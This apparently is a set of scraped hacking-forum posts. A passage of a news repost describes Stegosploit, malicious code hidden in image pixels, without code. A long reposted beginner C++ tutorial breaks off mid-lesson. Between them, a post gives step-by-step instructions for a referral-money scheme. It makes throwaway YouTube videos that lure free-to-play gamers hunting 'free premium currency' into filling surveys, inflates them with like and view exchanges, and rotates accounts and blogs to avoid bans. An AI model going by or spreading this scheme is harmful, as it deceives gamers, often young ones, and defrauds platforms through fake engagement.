Quote: \"" I don’t need to host a blog, \"" Shah  Hidden Content:  You must reply to see links  Motherboard, \"" I don’t need to host a website at all. I don’t even need to register a domain. I can [just] take an image, upload it somewhere and if I just point you toward that image, and you load this image in a browser, it will detonate. \"" The malicious code, dubbed IMAJS, is a combination of both image code as well as JavaScript hidden into a JPG or PNG image file. Shah hides the malicious code within the image’s pixels, and unless somebody zoom a lot into it, the image looks just fine from the outside.  Video Demonstration: Shah demonstrated to Lorenzo Franceschi of Motherboard exactly how his hack works. He used Franceschi’s profile picture and then prepared a demonstration video using his picture as the scapegoat. In the first video presentation, Shah shows a step by step process on how it is possible to hide malicious code inside an image file using steganography technique. You can watch the video given below: In the second video, Shah shows how his Stegosploit actually works. His exploit works only when the target opens the image file on his or her web browser and clicks on the picture. You are HACKED! Once the image is clicked, the system’s CPU shoots up to 100 percent usage, which indicates the exploit successfully worked. The malicious code IMAJS then sends the target machine’s data back to the attacker, thereby creating a text file on the target computer that says — \"" You are hacked! \"" Shah also has programmed his malicious image to do more stealthy tasks, like downloading and installing spyware on victim’s machine, as well as stealing sensitive data out of the victim’s computer. The bottom line here is: You should not presume the image files as \""innocent\"" anymore, as they can hide malicious code deep inside its pixels that could infect your computers. Therefore, always make sure before you click on one. Shah has been working on the research [ Hidden Content:  You must reply to see links ] during his spare time for almost five years, but he has not tested his technique on popular image sharing websites like Dropbox or Imgur. He also admitted that his method might not work everywhere.           """
0	Small method to earn around 40/50 dollar a week	""" This is honestly one of the best methods out there, and it is tested. It works 100%, so without further ado, ill show payment proof first! http://puu.sh/imzYC/c856df4857.png This happens every week now because I got lazy, but you can earn some sweet money with this! It is a pretty simple method, Ill explain below: How to Make Money using Referral Programs! 1 - Use Free to Play Games! I usually play free to play games online, and most of them have some sort of Premium Currency (pc). The longer you play the f2p game, more you want the premium currency to level up sooner or get better gear. We are going to use that to our advantage. Since these games already make the player hungry for PC, they go online and search for methods to get PC for free. They start looking on \""How to get free (insert currencys name here)\"". Some youtube videos will pop up with lots of virus and scam. Same thing for blogs. Usually people will click the first link and try it or they will give up. 2 - What You Need to Get There! Get a site which pays you in a lot of different giftcards and gives a good referral bonus. REMEMBER to NOT use a website that is focused on just making money. You need one that stimulates getting the currency early. Site that worked for me: Gifthulk Or google it. 3 - Make Use of Exchange Websites Go look for websites that exchange youtube likes/views. Example: addmefast, like4like etc. Once you find a website that works, many more will be found. Sign up there. Note: Script for AddMeFast on BHs forum. 4 - Upload a Youtube Video After that open your favorite video software. Im lazy so I use windows moviemaker. Now make a few shots of how the site looks, and make some cool images in paint on why they should sign up (to get that PC early is where you want it to head too). Finish up the video and dont worry about quality. Quality doesnt matter at all, as long as the video is longer than 20 seconds. Three or four motivational sentences. Upload that stuff on an alternative Youtube account and make sure you get some good keywords in there. 5 - Using Blogger.com Make a post with only your referral url, and make some more posts where you randomly copy and paste stuff from random forums. Get the link from your blog and place it in the description of your youtube video. You now have done half of the work! o/ 6- Go Back to Exchange Sites Distribute SOME of those points over your video. Get it to around 40 likes and 280/290 views. (Dont over do it or youll get your channel banned). Repeat these steps A LOT. Keep making videos, keep boosting them. Spread them on multiple accounts and upload lots of videos. NEVER put the referral to the beermoneysite, that will get you banned. Always use a blogger/wordpress and switch that one up too once in a while. 7 - Now WHAT? 99% of people randomly click through videos and will end up finding yours. 9/10 wont click the link, but the last one will. With enough videos you will get hundreds of hits on the beermoney site you chose, and the best part is that these people dont know about referrals, other beermoney sites, etc, so they will continue the fill out surveys to get their free Premium Currency. Thanks for reading and have fun! Follow my instructions to the point and you too will make money, just keep pushing and dont give up. reactions Wrote: Reactions from people who have used it: http://puu.sh/imyjr/b6eb18c5f9.png http://puu.sh/imynZ/d6125172f8.png Goodluck! """

0	C++ Tutorial	""" Ok first off I would like to say that I DID NOT WRITE THIS However I found it in some OLD backups of disks Ive found and thought I would share this. This is a GREAT beginner tutorial and it can also be used as a reference for experts... This is VERY long 20 lessons (I have them in text files which I will upload on the last post after the tutorial, but I do want the reference here on EZ (I know that I still havent finished my batch file tut, but that one Im writing from hand and its VERY extensive) Anyways without further ado: Lesson 1 - The Basics This tutorial is designed for everyone: even if youve never programmed before or if you have extensive experience programming in other languages and want to expand into C++! It is for everyone who wants the feeling of accomplishment from a working program.  Getting set up C++ is a programming language of many different dialects, similar to the way that each spoken language has many different dialects. In C++, dialects are not because the speakers live in the North or South. Instead, it is because there are many different compilers that support slightly different features. There are several common compilers: in particular, Borland C++, Microsoft C++, and GNU C++. There are also many front-end environments for the different compilers--the most common is Dev-C++ around GNUs G++ compiler. Some, such as G++, are free, while others are not. Please see the compiler listing for more information on how to get a compiler and set it up. Each of these compilers is slightly different. Each one should support the ANSI/ISO standard C++ functions, but each compiler will also have nonstandard functions (these functions are similar to slang spoken in different parts of a country). Sometimes the use of nonstandard functions will cause problems when you attempt to compile source code (the actual C++ written by a programmer and saved as a text file) with a different compiler. These tutorials use ANSI/ISO standard C++ and should not suffer from this problem (with sufficiently modern compilers). Note that if you are using an older compiler, such as TCLite, you should read check out some compatability issues. If you dont have a compiler, I strongly suggest that you get one. A simple compiler is sufficient for our use, but make sure that you do get one in order to get the most from these tutorials. The page linked above, compilers, lists compilers by operating system. C++ is a different breed of programming language. A C++ program begins with a function, a collection of commands that do \""something\"". The function that begins a C++ program is called main; this function is always called when the program first executes. From main, we can also call other functions whether they be written by us or by others. To access a standard function that comes with the compiler, you include a header with the #include directive. What this does is effectively take everything in the header and paste it into your program. Lets look at a working program:   Code: [Select] #include <iostream> using namespace std; int main() {   cout<<\""HEY, you, Im alive! Oh, and Hello World!\\"";   cin.get(); } Lets look at the elements of the program. The #include is a \""preprocessor\"" directive that tells the compiler to put code from the header called iostream into our program before actually creating the executable. By including header files, you an gain access to many different functions. For example, the cout function requires iostream. Following the include is the statement, \""using namespace std;\"". This line tells the compiler to use a group of functions that are part of the standard library (std). By including this line at the top of a file, you allow the program to use functions such as cout. The semicolon is part of the syntax of C and C++. It tells the compiler that youre at the end of a command. You will see later that the semicolon is used to end most commands in C++. The next imporant line is int main(). This line tells the compiler that there is a function named main, and that the function returns an integer, hence int. The \""curly braces\"" ({ and }) signal the beginning and end of functions and other code blocks. If you have programmed in Pascal, you will know them as BEGIN and END. Even if you havent programmed in Pascal, this is a good way to think about their meaning. The next line of the program may seem strange. If you have programmed in another language, you might expect that print would be the function used to display text. In C++, however, the cout object is used to display text. It uses the << symbols, known as \""insertion operators\"", to indicate what to output. cout<< results in a function call with the ensuing text as an argument to the function. The quotes tell the compiler that you want to output the literal string as-is. The \ sequence is actually treated as a single character that stands for a newline (well talk about this later in more detail). It moves the cursor on your screen to the next line. Again, notice the semicolon: it is added onto the end of all, such as function calls, in C++. The next command is cin.get(). This is another function call: it reads in input and expects the user to hit the return key. Many compiler environments will open a new console window, run the program, and then close the window. This command keeps that window from closing because the program is not done yet because it waits for you to hit enter. Including that line gives you time to see the program run. Upon reaching the end of main, the closing brace, our program will return the value of 0 (and integer, hence why we told main to return an int) to the operating system. This return value is important as it can be used to tell the OS whether our program succeeded or not. A return value of 0 means success and is returned automatically (but only for main, other functions require you to manually return a value), but if we wanted to return something else, such as 1, we would have to do it with a return statement: Code: [Select] #include <iostream> using namespace std; int main() {   cout<<\""HEY, you, Im alive! Oh, and Hello World!\\"";   cin.get();   return 1; } The final brace closes off the function. You should try compiling this program and running it. You can cut and paste the code into a file, save it as a .cpp (or whatever extension your compiler requires) file. If you are using a command-line compiler, such as Borland C++ 5.5, you should read the compiler instructions for information on how to compile. Otherwise compiling and running should be as simple as clicking a button with your mouse. You might start playing around with the cout function and get used to writing C++. Comments are critical for all but the most trivial programs and this tutorial will often use them to explain sections of code. When you tell the compiler a section of text is a comment, it will ignore it when running the code, allowing you to use any text you want to describe the real code. To create a comment use either //, which tells the compiler that the rest of the line is a comment, or /* and then */ to block off everything between as a comment. Certain compiler environments will change the color of a commented area, but some will not. Be certain not to accidentally comment out code (that is, to tell the compiler part of your code is a comment) you need for the program. When you are learning to program, it is useful to be able to comment out sections of code in order to see how the output is affected. So far you should be able to write a simple program to display information typed in by you, the programmer and to describe your program with comments. Thats great, but what about interacting with your user? Fortunately, it is also possible for your program to accept input. The function you use is known as cin, and is followed by the insertion operator >>. Of course, before you try to receive input, you must have a place to store that input. In programming, input and data are stored in variables. There are several different types of variables; when you tell the compiler you are declaring a variable, you must include the data type along with the name of the variable. Several basic types include char, int, and float. A variable of type char stores a single character, variables of type int store integers (numbers without decimal places), and variables of type float store numbers with decimal places. Each of these variable types - char, int, and float - is each a keyword that you use when you declare a variable. Sometimes it can be confusing to have multiple variable types when it seems like some variable types are redundant. Using the right variable size can be important for making your code readable and for efficiency--some variables require more memory than others. For now, suffice it to say that the different variable types will almost all be used! To declare a variable you use the syntax type <name>. It is permissible to declare multiple variables of the same type on the same line; each one should be separated by a comma. The declaration of a variable or set of variables should be followed by a semicolon (Note that this is the same procedure used when you call a function). If you attempt to use an undefined variable, your program will not run, and you will receive an error message informing you that you have made a mistake. Here are some variable declaration examples: Code: [Select] int x; int a, b, c, d; char letter; float the_float; While you can have multiple variables of the same type, you cannot have multiple variables with the same name. Moreover, you cannot have variables and functions with the same name. Here is a sample program demonstrating the use a a variable: Code: [Select] #include <iostream> using namespace std; int main() {   int thisisanumber;   cout<<\""Please enter a number: \"";   cin>> thisisanumber;   cin.ignore();   cout<<\""You entered: \""<< thisisanumber <<\""\\"";   cin.get(); } Lets break apart this program and examine it line by line. The keyword int declares thisisanumber to be an integer. The function cin>> reads a value into thisisanumber; the user must press enter before the number is read by the program. cin.ignore() is another function that reads and discards a character. Remember that when you type intput into a program, it takes the enter key too. We dont need this, so we throw it away. Keep in mind that the variable was declared an integer; if the user attempts to type in a decimal number, it will be truncated (that is, the decimal component of the number will be ignored). Try typing in a sequence of characters or a decimal number when you run the example program; the response will vary from input to input, but in no case is it particularly pretty. Notice that when printing out a variable quotation marks are not used. Were there quotation marks, the output would be \""You Entered: thisisanumber.\"" The lack of quotation marks informs the compiler that there is a variable, and therefore that the program should check the value of the variable in order to replace the variable name with the variable when executing the output function. Do not be confused by the inclusion of two separate insertion operators on one line. Including multiple insertion operators on one line is perfectly acceptable and all of the output will go to the same place. In fact, you must separate string literals (strings enclosed in quotation marks) and variables by giving each its own insertion operators (<<). Trying to put two variables together with only one << will give you an error message, do not try it. Do not forget to end functions and declarations with a semicolon. If you forget the semicolon, the compiler will give you an error message when you attempt to compile the program. Of course, no matter what type you use, variables are uninteresting without the ability to modify them. Several operators used with variables include the following: *, -, +, /, =, ==, >, <. The * multiplies, the - subtracts, and the + adds. It is of course important to realize that to modify the value of a variable inside the program it is rather important to use the equal sign. In some languages, the equal sign compares the value of the left and right values, but in C++ == is used for that task. The equal sign is still extremely useful. It sets the left input to the equal sign, which must be one, and only one, variable equal to the value on the right side of the equal sign. The operators that perform mathematical functions should be used on the right side of an equal sign in order to assign the result to a variable on the left side. Here are a few examples:   Code: [Select] a = 4 * 6; // (Note use of comments and of semicolon) a is 24 a = a + 5; // a equals the original value of a with five added to it a == 5     // Does NOT assign five to a. Rather, it checks to see if a equals 5. The other form of equal, ==, is not a way to assign a value to a variable. Rather, it checks to see if the variables are equal. It is useful in other areas of C++; for example, you will often use == in such constructions as conditional statements and loops. You can probably guess how < and > function. They are greater than and less than operators. For example:   Code: [Select] a < 5  // Checks to see if a is less than five a > 5  // Checks to see if a is greater than five a == 5 // Checks to see if a equals five, for good measure Lesson 2 - IF The ability to control the flow of your program, letting it make decisions on what code to execute, is valuable to the programmer. The if statement allows you to control if a program enters a section of code or not based on whether a given condition is true or false. One of the important functions of the if statement is that it allows the program to select an action based upon the users input. For example, by using an if statement to check a user entered password, your program can decide whether a user is allowed access to the program. Without a conditional statement such as the if statement, programs would run almost the exact same way every time. If statements allow the flow of the program to be changed, and so they allow algorithms and more interesting code. Before discussing the actual structure of the if statement, let us examine the meaning of TRUE and FALSE in computer terminology. A true statement is one that evaluates to a nonzero number. A false statement evaluates to zero. When you perform comparison with the relational operators, the operator will return 1 if the comparison is true, or 0 if the comparison is false. For example, the check 0 == 2 evaluates to 0. The check 2 == 2 evaluates to a 1. If this confuses you, try to use a cout statement to output the result of those various comparisons (for example cout<< ( 2 == 1 );) When programming, the aim of the program will often require the checking of one value stored by a variable against another value to determine whether one is larger, smaller, or equal to the other. There are a number of operators that allow these checks. Here are the relational operators, as they are known, along with examples: Code: [Select] >     greater than              5 > 4 is TRUE <     less than                 4 < 5 is TRUE >=    greater than or equal     4 >= 4 is TRUE <=    less than or equal        3 <= 4 is TRUE ==    equal to                  5 == 5 is TRUE !=    not equal to              5 != 4 is TRUE It is highly probable that you have seen these before, probably with slightly different symbols. They should not present any hindrance to understanding. Now that you understand TRUE and FALSE in computer terminology as well as the comparison operators, let us look at the actual structure of if statements. The structure of an if statement is as follows: Code: [Select] if ( TRUE )   Execute the next statement To have more than one statement execute after an if statement that evaluates to true, use braces, like we did with the body of a function. Anything inside braces is called a compound statement, or a block. For example: Code: [Select] if ( TRUE ) {   Execute all statements inside the braces } There is also the else statement. The code after it (whether a single line or code between brackets) is executed if the if statement is FALSE. It can look like this: Code: [Select] if ( TRUE ) {   // Execute these statements if TRUE } else {   // Execute these statements if FALSE } One use for else is if there are two conditional statements that may both evaluate to true, yet you wish only one of the two to have the code block following it to be executed. You can use an else if after the if statement; that way, if the first statement is true, the else if will be ignored, but if the if statement is false, it will then check the condition for the else if statement. If the if statement was true the else statement will not be checked. It is possible to use numerous else if statements. Lets look at a simple program for you to try out on your own.   Code: [Select] #include <iostream> using namespace std; int main()                            // Most important part of the program! {   int age;                            // Need a variable...     cout<<\""Please input your age: \"";    // Asks for age   cin>> age;                          // The input is put in age   cin.ignore();                       // Throw away enter   if ( age < 100 ) {                  // If the age is less than 100      cout<<\""You are pretty young!\\""; // Just to show you it works...   }   else if ( age == 100 ) {            // I use else just to show an example       cout<<\""You are old\\"";           // Just to show you it works...   }   else {     cout<<\""You are really old\\"";     // Executed if no other statement is   }   cin.get(); } Boolean operators allow you to create more complex conditional statements. For example, if you wish to check if a variable is both greater than five and less than ten, you could use the boolean AND to ensure both var > 5 and var < 10 are true. In the following discussion of boolean operators, I will capitalize the boolean operators in order to distinguish them from normal english. The actual C++ operators of equivalent function will be described further into the tutorial - the C++ symbols are not: OR, AND, NOT, although they are of equivalent function. When using if statements, you will often wish to check multiple different conditions. You must understand the Boolean operators OR, NOT, and AND. The boolean operators function in a similar way to the comparison operators: each returns 0 if evaluates to FALSE or 1 if it evaluates to TRUE. NOT: The NOT operator accepts one input. If that input is TRUE, it returns FALSE, and if that input is FALSE, it returns TRUE. For example, NOT (1) evalutes to 0, and NOT (0) evalutes to 1. NOT (any number but zero) evaluates to 0. In C and C++ NOT is written as !. NOT is evaluated prior to both AND and OR. AND: This is another important command. AND returns TRUE if both inputs are TRUE (if this AND that are true). (1) AND (0) would evaluate to zero because one of the inputs is false (both must be TRUE for it to evaluate to TRUE). (1) AND (1) evaluates to 1. (any number but 0) AND (0) evaluates to 0. The AND operator is written && in C++. Do not be confused by thinking it checks equality between numbers: it does not. Keep in mind that the AND operator is evaluated before the OR operator. OR: Very useful is the OR statement! If either (or both) of the two values it checks are TRUE then it returns TRUE. For example, (1) OR (0) evaluates to 1. (0) OR (0) evaluates to 0. The OR is written as || in C++. Those are the pipe characters. On your keyboard, they may look like a stretched colon. On my computer the pipe shares its key with \\. Keep in mind that OR will be evaluated after AND. It is possible to combine several boolean operators in a single statement; often you will find doing so to be of great value when creating complex expressions for if statements. What is !(1 && 0)? Of course, it would be TRUE. It is true is because 1 && 0 evaluates to 0 and !0 evaluates to TRUE (ie, 1). Try some of these - theyre not too hard.   Code: [Select] A. !( 1 || 0 )         ANSWER: 0 B. !( 1 || 1 && 0 )    ANSWER: 0 (AND is evaluated before OR) C. !( ( 1 || 0 ) && 0 )  ANSWER: 1 (Parenthesis are useful) Lesson 3 - Loops Loops are used to repeat a block of code. You should understand the concept of C++s true and false, because it will be necessary when working with loops (the conditions are the same as with if statements). There are three types of loops: for, while, and do..while. Each of them has their specific uses. They are all outlined below. FOR - for loops are the most useful type. The layout is Code: [Select] for ( variable initialization; condition; variable update ) {   Code to execute while the condition is true } The variable initialization allows you to either declare a variable and give it a value or give a value to an already existing variable. Second, the condition tells the program that while the conditional expression is true the loop should continue to repeat itself. The variable update section is the easiest way for a for loop to handle changing of the variable. It is possible to do things like x++, x = x + 10, or even x = random ( 5 ), and if you really wanted to, you could call other functions that do nothing to the variable but still have a useful effect on the code. Notice that a semicolon separates each of these sections, that is important. Also note that every single one of the sections may be empty, though the semicolons still have to be there. If the condition is empty, it is evaluated as true and the loop will repeat until something else stops it. Example: Code: [Select] #include <iostream> using namespace std; // So the program can see cout and endl int main() {   // The loop goes while x < 10, and x increases by one every loop   for ( int x = 0; x < 10; x++ ) {     // Keep in mind that the loop condition checks      //  the conditional statement before it loops again.     //  consequently, when x equals 10 the loop breaks.     // x is updated before the condition is checked.         cout<< x <<endl;   }   cin.get(); } This program is a very simple example of a for loop. x is set to zero, while x is less than 10 it calls cout<< x <<endl; and it adds 1 to x until the condition is met. Keep in mind also that the variable is incremented after the code in the loop is run for the first time. WHILE - WHILE loops are very simple. The basic structure is while ( condition ) { Code to execute while the condition is true } The true represents a boolean expression which could be x == 1 or while ( x != 7 ) (x does not equal 7). It can be any combination of boolean statements that are legal. Even, (while x = =5 || v == 7) which says execute the code while x equals five or while v equals 7. Notice that a while loop is the same as a for loop without the initialization and update sections. However, an empty condition is not legal for a while loop as it is with a for loop. Example: Code: [Select] #include <iostream> using namespace std; // So we can see cout and endl int main() {    int x = 0;  // Dont forget to declare variables     while ( x < 10 ) { // While x is less than 10      cout<< x <<endl;     x++;             // Update x so the condition can be met eventually   }   cin.get(); } This was another simple example, but it is longer than the above FOR loop. The easiest way to think of the loop is that when it reaches the brace at the end it jumps back up to the beginning of the loop, which checks the condition again and decides whether to repeat the block another time, or stop and move to the next statement after the block. DO..WHILE - DO..WHILE loops are useful for things that want to loop at least once. The structure is Code: [Select] do { } while ( condition ); Notice that the condition is tested at the end of the block instead of the beginning, so the block will be executed at least once. If the condition is true, we jump back to the beginning of the block and execute it again. A do..while loop is basically a reversed while loop. A while loop says \""Loop while the condition is true, and execute this block of code\"", a do..while loop says \""Execute this block of code, and loop while the condition is true\"". Example: Code: [Select] #include <iostream> using namespace std; int main() {   int x;   x = 0;   do {     // \""Hello, world!\"" is printed at least one time     //  even though the condition is false     cout<<\""Hello, world!\\"";   } while ( x != 0 );   cin.get(); } Keep in mind that you must include a trailing semi-colon after the while in the above example. A common error is to forget that a do..while loop must be terminated with a semicolon (the other loops should not be terminated with a semicolon, adding to the confusion). Notice that this loop will execute once, because it automatically executes before checking the condition. Lesson 4 - Functions Now that you should have learned about variables, loops, and conditional statements it is time to learn about functions. You should have an idea of their uses as we have already use them and defined one in the guise of main. cin.get() is an example of a function. In general, functions are blocks of code that perform a number of pre-defined commands to accomplish something productive. Functions that a programmer writes will generally require a prototype. Just like a blueprint, the prototype tells the compiler what the function will return, what the function will be called, as well as what arguments the function can be passed. When I say that the function returns a value, I mean that the function can be used in the same manner as a variable would be. For example, a variable can be set equal to a function that returns a value between zero and four. For example: Code: [Select] #include <cstdlib>   // Include rand() using namespace std; // Make rand() visible int a = rand(); // rand is a standard function that all compilers have Do not think that a will change at random, it will be set to the value returned when the function is called, but it will not change again. The general format for a prototype is simple: Code: [Select] return-type function_name ( arg_type arg1, ..., arg_type argN ); There can be more than one argument passed to a function or none at all (where the parentheses are empty), and it does not have to return a value. Functions that do not return values have a return type of void. Lets look at a function prototype: Code: [Select] int mult ( int x, int y ); This prototype specifies that the function mult will accept two arguments, both integers, and that it will return an integer. Do not forget the trailing semi-colon. Without it, the compiler will probably think that you are trying to write the actual definition of the function. When the programmer actually defines the function, it will begin with the prototype, minus the semi-colon. Then there should always be a block with the code that the function is to execute, just as you would write it for the main function. Any of the arguments passed to the function can be used as if they were declared in the block. Finally, end it all with a cherry and a closing brace. Okay, maybe not a cherry. Lets look at an example program: Code: [Select] #include <iostream> using namespace std; int mult ( int x, int y ); int main() {   int x;   int y;     cout<<\""Please input two numbers to be multiplied: \"";   cin>> x >> y;   cin.ignore();   cout<<\""The product of your two numbers is \""<< mult ( x, y ) <<\""\\"";   cin.get(); } int mult ( int x, int y ) {   return x * y; } This program begins with the only necessary include file and a directive to make the std namespace visible. Everything in the standard headers is inside of the std namespace and not visible to our programs unless we make them so. Next is the prototype of the function. Notice that it has the final semi-colon! The main function returns an integer, which you should always have to conform to the standard. You should not have trouble understanding the input and output functions. It is fine to use cin to input to variables as the program does. But when typing in the numbers, be sure to separate them by a space so that cin can tell them apart and put them in the right variables. Notice how cout actually outputs what appears to be the mult function. What is really happening is cout is printing the value returned by mult, not mult itself. The result would be the same as if we had use this print instead Code: [Select] cout<<\""The product of your two numbers is \""<< x * y <<\""\\""; The mult function is actually defined below main. Due to its prototype being above main, the compiler still recognizes it as being defined, and so the compiler will not give an error about mult being undefined. As long as the prototype is present, a function can be used even if there is no definition. However, the code cannot be run without a definition even though it will compile. The prototype and definition can be combined into one also. If mult were defined before it is used, we could do away with the prototype because the definition can act as a prototype as well. Return is the keyword used to force the function to return a value. Note that it is possible to have a function that returns no value. If a function returns void, the retun statement is valid, but only if it does not have an expression. In otherwords, for a function that returns void, the statement \""return;\"" is legal, but redundant. The most important functional (Pun semi-intended) question is why do we need a function? Functions have many uses. For example, a programmer may have a block of code that he has repeated forty times throughout the program. A function to execute that code would save a great deal of space, and it would also make the program more readable. Also, having only one copy of the code makes it easier to make changes. Would you rather make forty little changes scattered all throughout a potentially large program, or one change to the function body? So would I. Another reason for functions is to break down a complex program into logical parts. For example, take a menu program that runs complex code when a menu choice is selected. The program would probably best be served by making functions for each of the actual menu choices, and then breaking down the complex tasks into smaller, more manageable tasks, which could be in their own functions. In this way, a program can be designed that makes sense when read. And has a structure that is easier to understand quickly. The worst programs usually only have the required function, main, and fill it with pages of jumbled code. Lesson 5 - Switch Case Switch case statements are a substitute for long if statements that compare to an integral value. The basic format for using switch case is outlined below. Code: [Select] switch ( value ) { case this:   Code to execute if value == this   break; case that:   Code to execute if value == that   break; ... default:   Code to execute if value != this or that   break; } The condition of a switch statement is a value. The case says that if it has the value of whatever is after that case then do whatever follows the colon. The break is used to break out of the case statements. Break is a keyword that breaks out of the code block, usually surrounded by braces, which it is in. In this case, break prevents the program from falling through and executing the code in all the other case statements. An important thing to note about the switch statement is that the case values may only be constant integral expressions. Sadly, it isnt legal to use case like this: Code: [Select] int a = 10; int b = 10; int c = 20; switch ( a ) { case b:   // Code   break; case c:   // Code   break; default:   // Code   break; } The default case is optional, but it is wise to include it as it handles any unexpected cases. Switch statements serves as a simple way to write long if statements when the requirements are met. Often it can be used to process input from a user. Below is a sample program, in which not all of the proper functions are actually declared, but which shows how one would use switch in a program. Code: [Select] #include <iostream> using namespace std; void playgame(); void loadgame(); void playmultiplayer(); int main() {   int input;     cout<<\""1. Play game\\"";   cout<<\""2. Load game\\"";   cout<<\""3. Play multiplayer\\"";   cout<<\""4. Exit\\"";   cout<<\""Selection: \"";   cin>> input;   switch ( input ) {   case 1:            // Note the colon, not a semicolon     playgame();     break;   case 2:            // Note the colon, not a semicolon     loadgame();     break;   case 3:            // Note the colon, not a semicolon     playmultiplayer();     break;   case 4:            // Note the colon, not a semicolon     cout<<\""Thank you for playing!\\"";     break;   default:            // Note the colon, not a semicolon     cout<<\""Error, bad input, quitting\\"";     break;   }   cin.get(); } This program will compile, but cannot be run until the undefined functions are given bodies, but it serves as a model (albeit simple) for processing input. If you do not understand this then try mentally putting in if statements for the case statements. Default simply skips out of the switch case construction and allows the program to terminate naturally. If you do not like that, then you can make a loop around the whole thing to have it wait for valid input. You could easily make a few small functions if you wish to test the code.Lesson 6 - Pointers Pointers can be confusing, and at times, you may wonder why you would ever want to use them. The truth is, they can make some things much easier. For example, using pointers is one way to have a function modify a variable passed to it. It is also possible to use pointers to dynamically allocate memory allowing certain programming techniques, such as linked lists and resizable arrays. Pointers are what they sound like...pointers. They point to locations in memory. Picture a big jar that holds the location of another jar. In the other jar holds a piece of paper with the number 12 written on it. The jar with the 12 is an integer, and the jar with the memory address of the 12 is a pointer. Pointer syntax can also be confusing, because pointers can both give the memory location and give the actual value stored in that same location. When a pointer is declared, the syntax is this: variable_type *name; Notice the *. This is the key to declaring a pointer, if you use it before the variable name, it will declare the variable to be a pointer. As I have said, there are two ways to use the pointer to access information about the memory address it points to. It is possible to have it give the actual address to another variable, or to pass it into a function. To do so, simply use the name of the pointer without the *. However, to access the actual memory location, use the *. The technical name for this doing this is dereferencing. In order to have a pointer actually point to another variable it is necessary to have the memory address of that variable also. To get the memory address of the variable, put the & sign in front of the variable name. This makes it give its address. This is called the address operator, because it returns the memory address. For example: Code: [Select] #include <iostream> using namespace std; int main() {    int x;            // A normal integer   int *p;           // A pointer to an integer   p = &x;           // Read it, \""assign the address of x to p\""   cin>> x;          // Put a value in x, we could also use *p here   cin.ignore();   cout<< *p <<\""\\""; // Note the use of the * to get the value   cin.get(); } The cout outputs the value in x. Why is that? Well, look at the code. The integer is called x. A pointer to an integer is then defined as p. Then it stores the memory location of x in pointer by using the address operator (&). If you wish, you can think of it as if the jar that had the integer had a ampersand in it then it would output its name (in pointers, the memory address) Then the user inputs the value for x. Then the cout uses the * to put the value stored in the memory location of pointer. If the jar with the name of the other jar in it had a * in front of it would give the value stored in the jar with the same name as the one in the jar with the name. It is not too hard, the * gives the value in the location. The unasterisked gives the memory location. Notice that in the above example, pointer is initialized to point to a specific memory address before it is used. If this was not the case, it could be pointing to anything. This can lead to extremely unpleasant consequences to the computer. You should always initialize pointers before you use them. It is also possible to initialize pointers using free memory. This allows dynamic allocation of array memory. It is most useful for setting up structures called linked lists. This difficult topic is too complex for this text. An understanding of the keywords new and delete will, however, be tremendously helpful in the future. The keyword new is used to initialize pointers with memory from free store (a section of memory available to all programs). The syntax looks like the example: Code: [Select] int *ptr = new int; It initializes ptr to point to a memory address of size int (because variables have different sizes, number of bytes, this is necessary). The memory that is pointed to becomes unavailable to other programs. This means that the careful coder should free this memory at the end of its usage. The delete operator frees up the memory allocated through new. To do so, the syntax is as in the example. Code: [Select] delete ptr; After deleting a pointer, it is a good idea to reset it to point to 0. When 0 is assigned to a pointer, the pointer becomes a null pointer, in other words, it points to nothing. By doing this, when you do something foolish with the pointer (it happens a lot, even with experienced programmers), you find out immediately instead of later, when you have done considerable damage. Lesson 7 - Structures Before discussing classes, this lesson will be an introduction to data structures similar to classes. Structures are a way of storing many different variables of different types under the same name. This makes it a more modular program, which is easier to modify because its design makes things more compact. It is also useful for databases. The format for declaring a structure (in C++, it is different in C) is Code: [Select] struct Tag {   Members }; Where Tag is the name of the entire type of structure. To actually create a single structure the syntax is Code: [Select] Tag name_of_single_structure; To access a variable of the structure it goes Code: [Select] name_of_single_structure.name_of_variable; For example: Code: [Select] struct example {   int x; }; example an_example; //Treating it like a normal variable type an_example.x = 33;  //How to access its members Here is an example program: Code: [Select] struct database {   int id_number;   int age;   float salary; }; int main() {   database employee;  //There is now an employee variable that has modifiable                        // variables inside it.   employee.age = 22;   employee.id_number = 1;   employee.salary = 12000.21; } The struct database declares that database has three variables in it, age, id_number, and salary. You can use database like a variable type like int. You can create an employee with the database type as I did above. Then, to modify it you call everything with the employee. in front of it. You can also return structures from functions by defining their return type as a structure type. For instance: Code: [Select] database fn(); I will talk only a little bit about unions as well. Unions are like structures except that all the variables share the same memory. When a union is declared the compiler allocates enough memory for the largest data-type in the union. Its like a giant storage chest where you can store one large item, or a small item, but never the both at the same time. The . operator is used to access different variables inside a union also. As a final note, if you wish to have a pointer to a structure, to actually access the information stored inside the structure that is pointed to, you use the -> operator in place of the . operator. All points about pointers still apply. A quick example: Code: [Select] #include <iostream> using namespace std; struct xampl {   int x; }; int main() {     xampl structure;   xampl *ptr;     structure.x = 12;   ptr = &structure; // Yes, you need the & when dealing with structures                     //  and using pointers to them   cout<< ptr->x;    // The -> acts somewhat like the * when used with pointers                     //  It says, get whatever is at that memory address                     //  Not \""get what that memory address is\""   cin.get();                     } Lesson 8 - Arrays Arrays are useful critters because they can be used in many ways. For example, a tic-tac-toe board can be held in an array. Arrays are essentially a way to store many values under the same name. You can make an array out of any data-type including structures and classes. Think about arrays like this: Code: [Select] [][][][][][] Each of the bracket pairs is a slot(element) in the array, and you can put information into each one of them. It is almost like having a group of variables side by side. Lets look at the syntax for declaring an array. Code: [Select] int examplearray[100]; // This declares an array This would make an integer array with 100 slots, or places to store values(also called elements). To access a specific part element of the array, you merely put the array name and, in brackets, an index number. This corresponds to a specific element of the array. The one trick is that the first index number, and thus the first element, is zero, and the last is the number of elements minus one. 0-99 in a 100 element array, for example. What can you do with this simple knowledge? Lets say you want to store a string, because C++ has no built-in datatype for strings, you can make an array of characters. For example: Code: [Select] char astring[100]; will allow you to declare a char array of 100 elements, or slots. Then you can receive input into it it from the user, and if the user types in a long string, it will go in the array. The neat thing is that it is very easy to work with strings in this way, and there is even a header file called cstring. There is another lesson on the uses of strings, so its not necessary to discuss here. The most useful aspect of arrays is multidimensional arrays. How I think about multi-dimensional arrays: Code: [Select] [][][][][] [][][][][] [][][][][] [][][][][] [][][][][] This is a graphic of what a two-dimensional array looks like when I visualize it. For example: Code: [Select] int twodimensionalarray[8][8]; declares an array that has two dimensions. Think of it as a chessboard. You can easily use this to store information about some kind of game or to write something like tic-tac-toe. To access it, all you need are two variables, one that goes in the first slot and one that goes in the second slot. You can even make a three dimensional array, though you probably wont need to. In fact, you could make a four-hundred dimensional array. It would be confusing to visualize, however. Arrays are treated like any other variable in most ways. You can modify one value in it by putting: 